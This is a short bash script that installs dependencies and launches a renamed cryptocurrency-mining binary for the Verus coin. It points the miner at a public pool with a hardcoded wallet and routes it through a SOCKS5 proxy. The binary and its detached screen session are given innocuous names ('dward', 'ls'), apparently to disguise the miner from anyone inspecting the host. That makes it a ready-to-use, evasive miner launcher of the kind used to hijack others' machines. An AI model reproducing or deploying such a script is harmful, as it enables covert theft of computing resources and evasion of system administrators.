#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x dward
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=REpjC6VmRd7LwtK9xuWEZQfPvSYpBCia5s
WORKER=$(echo $(shuf -i 1-3 -n 1)-ALVAR)
PROXY=socks5://176.104.57.15:83
./dward -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
